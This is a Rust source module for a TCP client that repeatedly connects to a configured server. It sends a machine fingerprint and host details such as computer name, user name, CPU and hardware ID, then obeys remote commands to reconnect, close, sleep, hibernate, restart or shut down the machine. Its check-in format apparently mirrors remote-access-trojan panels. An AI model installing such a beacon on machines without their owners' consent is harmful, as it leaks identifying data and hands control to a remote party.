use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

use crate::{id, msg, power};

pub struct Target {
    pub ip: String,
    pub port: u16,
}

pub enum Flow {
    Reconnect,
    Close,
    Power,
}

pub fn run(target: &Target) -> io::Result<()> {
    let machine = id::machine_id().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "identity"))?;
    let hwid = id::hwid(&machine);
    let fingerprint = id::fingerprint_from_machine_id(&machine);

    loop {
        match connect(target, &hwid, &fingerprint) {
            Ok(Flow::Close | Flow::Power) => return Ok(()),
            Ok(Flow::Reconnect) | Err(_) => {
                println!("{}", msg::OUT_RECONNECT);
                std::thread::sleep(Duration::from_secs(msg::RETRY_SECS));
            }
        }
    }
}

fn connect(target: &Target, hwid: &str, fingerprint: &str) -> io::Result<Flow> {
    let started = Instant::now();
    let mut stream = TcpStream::connect((&*target.ip, target.port))?;
    stream.set_read_timeout(Some(Duration::from_secs(msg::HEARTBEAT_SECS)))?;
    let ping = started.elapsed().as_millis();
    send(&mut stream, &format!("{}{}", msg::HELLO, fingerprint))?;
    send(&mut stream, &format!("{}{}", msg::DATA, telemetry(target, hwid, fingerprint, ping)))?;
    println!("{} {}:{}", msg::OUT_CONNECTED, target.ip, target.port);

    let mut reader = BufReader::new(stream.try_clone()?);
    let mut line = String::new();

    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => return Ok(Flow::Reconnect),
            Ok(_) => match line.trim() {
                msg::REQ_DATA => {
                    send(&mut stream, msg::PONG)?;
                    send(
                        &mut stream,
                        &format!("{}{}", msg::DATA, telemetry(target, hwid, fingerprint, 0)),
                    )?;
                }
                value if value.starts_with(msg::CMD) => {
                    let command = value[4..].trim().to_ascii_uppercase();
                    match command.as_str() {
                        msg::RECONNECT => {
                            send(&mut stream, &format!("{}:{}", msg::ACK, msg::RECONNECT))?;
                            return Ok(Flow::Reconnect);
                        }
                        msg::CLOSE => {
                            send(&mut stream, &format!("{}:{}", msg::ACK, msg::CLOSE))?;
                            return Ok(Flow::Close);
                        }
                        msg::SLEEP | msg::HIBERNATE | msg::RESTART | msg::SHUTDOWN => {
                            let ok = power::run(command.as_str());
                            send(
                                &mut stream,
                                &format!("{}:{}", if ok { msg::ACK } else { msg::ERR }, command),
                            )?;
                            return Ok(Flow::Power);
                        }
                        _ => {}
                    }
                }
                _ => {}
            },
            Err(error)
                if matches!(error.kind(), io::ErrorKind::TimedOut | io::ErrorKind::WouldBlock) =>
            {
                send(&mut stream, msg::HB)?;
            }
            Err(error) => return Err(error),
        }
    }
}

fn send(stream: &mut TcpStream, value: &str) -> io::Result<()> {
    stream.write_all(format!("{}\n", value).as_bytes())?;
    stream.flush()
}

fn telemetry(target: &Target, hwid: &str, fingerprint: &str, ping: u128) -> String {
    let computer = env("COMPUTERNAME", msg::UNKNOWN);
    let user = env("USERNAME", msg::UNKNOWN);
    let cpu = env("PROCESSOR_IDENTIFIER", msg::UNKNOWN);
    let country = if matches!(target.ip.as_str(), "127.0.0.1" | "::1") {
        msg::LOCAL.to_owned()
    } else {
        msg::UNKNOWN.to_owned()
    };

    [
        country,
        computer,
        msg::TAG.to_owned(),
        user,
        msg::PROTOCOL.to_owned(),
        "User".to_owned(),
        "Windows".to_owned(),
        msg::UNKNOWN.to_owned(),
        cpu,
        msg::UNKNOWN.to_owned(),
        msg::UNKNOWN.to_owned(),
        msg::UNKNOWN.to_owned(),
        msg::UNKNOWN.to_owned(),
        format!("{} ms", ping),
        hwid.to_owned(),
        fingerprint.to_owned(),
    ]
    .into_iter()
    .map(|value| clean(&value))
    .collect::<Vec<_>>()
    .join("|")
}

fn clean(value: &str) -> String {
    value
        .replace('|', "/")
        .replace(['\r', '\n'], " ")
        .trim()
        .to_owned()
}

fn env(key: &str, fallback: &str) -> String {
    std::env::var(key)
        .ok()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| fallback.to_owned())
}

#[cfg(test)]
pub fn test_telemetry() -> String {
    telemetry(
        &Target { ip: msg::DEFAULT_IP.to_owned(), port: msg::DEFAULT_PORT },
        "hwid",
        "fingerprint",
        1,
    )
}
